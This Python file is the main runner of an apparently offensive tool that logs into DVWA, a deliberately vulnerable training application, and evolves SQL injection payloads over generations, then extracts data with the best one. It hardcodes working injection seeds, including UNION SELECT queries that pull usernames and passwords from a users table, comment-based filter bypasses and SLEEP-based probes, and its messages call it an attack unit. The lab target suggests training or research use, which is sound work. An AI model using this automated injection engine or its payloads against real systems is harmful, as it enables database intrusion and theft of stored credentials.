import sys
import os
import random
import time

# Ensure imports work from current directory
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from utils.http_client import HTTPClient
from utils.experience_manager import ExperienceManager
from core.island_manager import IslandManager
from core.context_discoverer import ContextDiscoverer
from utils.data_extractor import DataExtractor

def run_prometheus():
    print("\n" + "="*50, flush=True)
    print("--- [ القيادة والسيطرة: وحدة الهجوم Initialized ] ---", flush=True)
    print("="*50, flush=True)
    
    client = HTTPClient(base_url=os.getenv("TARGET_URL", "http://localhost/"))
    exp_manager = ExperienceManager()
    extractor = DataExtractor()
    
    target_user = os.getenv("TARGET_USER", "admin")
    target_pass = os.getenv("TARGET_PASS", "password")
    
    # Force medium security as requested by user workflow
    target_security = "medium" 
    
    pop_size = int(os.getenv("POPULATION_SIZE", "12"))
    max_gens = int(os.getenv("MAX_GENERATIONS", "30"))

    # المرحلة 1 و 2: تسجيل الدخول وضبط الحماية
    if not client.setup_dvwa(username=target_user, password=target_pass, security_level=target_security):
        print("[!] Failed to establish session.", flush=True)
        return

    # المرحلة 3: التوجه للحقن (تعيين الإعدادات مباشرة بدون استكشاف)
    inj_type = "QUOTELESS_STRING" # Default for Medium
    db_type = "MySQL"
    disable_quotes = True 
    
    print(f"[*] Targeting SQL Injection with Direct POST Mode (Security: {target_security})", flush=True)
    
    # Targets Persistence
    exp_manager.save_target_profile(client.base_url, db_type=db_type)
    
    # Load payloads from database API
    print("[*] Loading base payloads from Database...", flush=True)
    base_payloads = client.fetch_base_payloads()
    
    # Fallback/Default payloads if DB is empty or inaccessible
    if not base_payloads:
        base_payloads = [
          "1 OR 1=1", "1 AND 1=1", "1 OR true", "1 UNION SELECT 1,2", 
          "1 UNION SELECT user,password FROM users", # Targeted Password Seed
          "1 UNION SELECT password,NULL FROM users", # Targeted Password Seed
          "1 UNION SELECT 1,group_concat(user,0x3a,password) FROM users", # Advanced Seed
          "1 UNION SELECT database(),user()", "1 UNION SELECT NULL,NULL",
          "1 || 2=2", "1 && 3=3", "1 XOR 1=2", "1 UNION/*bypass*/SELECT 1,2",
          "1/*!50000UNION*//*!50000SELECT*/1,2"
        ]

    # Add quote-based seeds if level is low
    if target_security == "low":
        base_payloads.extend([
            "admin'--", "' OR '1'='1", "1' UNION SELECT 1,2#",
            "1' AND 1=1#", "1' AND SLEEP(5)#"
        ])

    island = IslandManager(client, base_payloads, exp_manager, population_size=pop_size, context=inj_type, disable_strings=disable_quotes)
    
    start_gen = island.current_gen
    max_generations = start_gen + max_gens
    successful_payloads = set(island.hall_of_fame)

    for gen in range(start_gen, max_generations):
        print(f"\n[+] Generation {gen + 1}/{max_generations}", flush=True)
        island.evolve_generation(gen)
        
        # Awareness: Check if we have new successes
        current_successes = set(island.hall_of_fame)
        new_successes = current_successes - successful_payloads
        
        if new_successes:
            for payload in new_successes:
                print(f"\n[!!!] NEW EXPLOIT DISCOVERED: {payload}", flush=True)
                successful_payloads.add(payload)
            
            # We don't stop early anymore. We continue to find MORE and BETTER exploits (like passwords)
            # as requested by the user.
    
    if successful_payloads:
        print("\n" + "*"*60, flush=True)
        print(f"[!!!] ATTACK PHASE COMPLETE: {len(successful_payloads)} SUCCESSFUL EXPLOITS FOUND", flush=True)
        for i, p in enumerate(successful_payloads):
            print(f"  {i+1}. {p}", flush=True)
        print("*"*60, flush=True)
        
        # Use the best one for extraction
        best_payload = list(successful_payloads)[0]
        print(f"\n[*] Initializing Data Extraction with optimal payload...", flush=True)
        final_response = client.send_request(best_payload)
        extracted_data = extractor.extract(final_response['text'])
        print(extractor.format_report(extracted_data), flush=True)
    else:
        print("\n[!] Max generations reached. No full exploit found.", flush=True)

if __name__ == "__main__":
    try:
        run_prometheus()
    except KeyboardInterrupt:
        print("\n[!] وحدة الهجوم halted by user.", flush=True)
        sys.exit(0)
